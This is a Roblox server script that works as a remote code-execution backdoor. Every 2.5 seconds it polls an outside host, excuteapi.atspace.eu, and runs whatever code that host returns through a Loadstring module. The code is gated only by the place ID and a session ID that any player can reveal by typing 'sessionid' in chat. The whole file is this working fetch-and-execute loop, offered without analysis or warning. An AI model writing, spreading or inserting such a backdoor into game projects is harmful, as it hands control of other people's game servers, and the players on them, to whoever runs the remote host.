local ServerScriptService = game:GetService("ServerScriptService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local MainScript = ServerScriptService:WaitForChild("Serverify")

-- Check if Loadstring module exists
local Loadstring
local success, err = pcall(function()
    Loadstring = require(MainScript:WaitForChild("Loadstring"))
end)

if not success then
    warn("Loadstring module could not be found or loaded:", err)
end

local cursessionid = tostring(math.random(1, 1000))
local lasttime = 0
local lasthash = "N"

print("Place ID:", game.PlaceId)

-- Player Added Listener
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg, rec)
        if string.find(msg, "sessionid") then
            local Notify = ReplicatedStorage:FindFirstChild("Notify")
            if Notify and Notify:IsA("RemoteEvent") then
                Notify:FireClient(plr, "Session ID - " .. cursessionid)
            else
                warn("Notify RemoteEvent not found in ReplicatedStorage.")
            end
        end
    end)
end)

-- Periodic HTTP request loop
while wait(2.5) do
    local success, res = pcall(function()
        return HttpService:GetAsync("http://excuteapi.atspace.eu/last.php")
    end)
    
    if success then
        local json = HttpService:JSONDecode(res)
        local hash = json["hash"]
        local code = json["script"]
        local gameid = json["gameid"]
        local sessionid = json["sessionid"]
        
        if hash ~= lasthash and gameid == tostring(game.PlaceId) and sessionid == cursessionid then
            -- Execute the code if new hash matches
            local loadSuccess, err = pcall(function()
                Loadstring(code)()  -- Assuming Execute is a method in Loadstring for running code
            end)
            if not loadSuccess then
                warn("Error executing code:", err)
            end
            lasthash = hash
        end
    else
        warn("Failed to retrieve HTTP response:", res)
    end
end
